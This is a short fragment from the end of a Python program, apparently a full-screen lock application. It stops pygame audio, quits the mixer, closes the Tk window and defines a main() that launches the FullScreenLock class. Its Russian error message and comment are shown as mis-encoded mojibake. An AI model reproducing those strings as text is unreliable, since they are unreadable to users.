            if self.music_available:
                pygame.mixer.stop()
        except Exception as e:
            print(f"ĞÑˆĞ¸Ğ±ĞºĞ°: {e}")
        finally:
            self.music_playing = False
            self.alarm_music_playing = False
            try:
                pygame.mixer.quit()
            except:
                pass
            self.root.destroy()

#Ğ—Ğ°Ğ¿ÑƒÑĞº ĞºĞ¾Ğ´Ğ°
def main():
    app = FullScreenLock()
    app.run()


if __name__ == "__main__":
    main()
